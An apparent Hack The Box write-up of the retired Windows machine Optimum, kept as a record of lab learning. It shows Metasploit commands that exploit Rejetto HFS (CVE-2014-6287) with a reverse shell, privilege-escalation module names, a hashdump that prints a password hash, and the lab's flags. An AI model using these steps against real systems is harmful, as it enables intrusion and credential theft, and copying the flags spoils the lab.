---
layout: writeup
name: "optimum"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/optimum/
date: 2026-02-25
pwned: true
---
# Hack The Box - Optimum (10.10.10.8)

## 🧠 Summary

**Optimum** is a Windows machine vulnerable to remote code execution via **Rejetto HttpFileServer 2.3** (CVE-2014-6287). Using Metasploit, we gain initial access with a reverse shell and elevate privileges to `NT AUTHORITY\SYSTEM`. We attempt to gather user credentials post-exploitation, although some hash cracking attempts fail.

---

## 🔍 Enumeration

### 🔹 Nmap

```bash
nmap -p- optimum.htb --min-rate 5000
nmap -p 80 -sC -sV optimum.htb -oN nmap_alert
```

**Results:**
- Port 80: HttpFileServer 2.3 (HFS 2.3)

---

## 💥 Exploitation

### 🔸 Rejetto HFS RCE - CVE-2014-6287

```bash
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(...) > set RHOSTS optimum.htb
msf6 exploit(...) > set LHOST 10.10.14.12
msf6 exploit(...) > run
```

✅ **Success:** Gained Meterpreter session as `OPTIMUM\kostas`.

---

## 🏁 Flags

```bash
C:\Users\kostas\Desktop>type user.txt
8caabc0f5be35b8d20806d90177ed205

C:\Users\Administrator\Desktop>type root.txt
25acf6353c34805023aab8425bd5e6e6
```

---

## 🔧 Privilege Escalation

### 🧩 Step 1: Upload and Run winPEAS

```bash
meterpreter > upload winPEASx86.exe
meterpreter > execute -f winPEASx86.exe
```

Used to scan for privilege escalation vectors.

---

### 🧩 Step 2: Local Exploit Suggester

```bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...) > set SESSION 2
msf6 post(...) > run
```

**Findings:**
- Multiple working privilege escalation options:
  - `bypassuac_comhijack`
  - `ms16_032_secondary_logon_handle_privesc`
  - `cve_2020_0787` (BITS arbitrary file move)

Eventually gained SYSTEM privileges.

```bash
meterpreter > getuid
NT AUTHORITY\SYSTEM
```

---

## 🔐 Credential Dumping

```bash
meterpreter > hashdump
kostas:fb7c6aab6468ef0383f97a12b78ab8ac
```

- Attempted to crack `kostas` hash via hashcat (unsuccessful)
- Ran `post/windows/gather/credentials/windows_autologin` with no valid credentials found

---

## 📌 Notes

- Initial access was simple using **Rejetto HFS exploit** via Metasploit
- Multiple local privesc options worked — ideal for testing Metasploit post modules
- Credential gathering attempts were **inconclusive**, further research needed on credential recovery techniques

---

*Writeup by [inkedqt](https://github.com/inkedqt)*
